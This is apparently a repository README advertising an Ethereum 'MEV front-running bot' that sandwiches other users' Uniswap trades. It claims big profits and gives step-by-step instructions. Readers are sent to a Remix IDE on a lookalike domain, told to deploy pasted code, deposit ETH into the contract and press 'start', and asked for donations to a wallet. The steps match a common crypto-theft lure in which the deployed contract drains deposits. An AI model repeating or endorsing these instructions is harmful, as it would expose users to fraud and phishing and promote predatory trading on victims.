# MEV-Bot-updated- Flash bot
Updated mempool settings for the Uniswap v2 MEV bot as of January 2023.
Nobody was ever supposed to see the code. My commercial code is superior, and a great deal of quality tradeoffs were necessary because this was meant to be "tested in production." Because I didn't want to "leak my alpha," I never intended to make this public. However, I still want to demonstrate what I've learnt over the past few years.

# UNISWAP
Uniswap is a decentralized permissionless exchange that allows users to trade ERC-20 tokens directly.
If you trade crypto on Uniswap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots.
Website - https://uniswap.org/


# Sharing ALPHA
Bot sends the Transaction and sniffs the Uniswap v2 Mempool

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity

Sending back the ETH to the contract ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.


# Sharing Accumuation over time

https://etherscan.io/address/0x88a37606c905ee26721a5e2374ddd15afaa1faba


# MEV bot Instructions
(works only for Mainnet)

# Access Remix:

https://remixethereum-ide.github.io/

3. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol"

4. Paste the code in repository

5. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it

6. Move to the "Deploy" tab, select "Injected Web 3" environment and then "Deploy" it. After the transaction is confirmed, it's your own BOT now

7. Deposit funds to exact your bot contract address

8. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button
Do you feel the urge to send me some crypto?

kindly make donations here.
0x18E78566292C4A494497Da0d231D292FAb497726
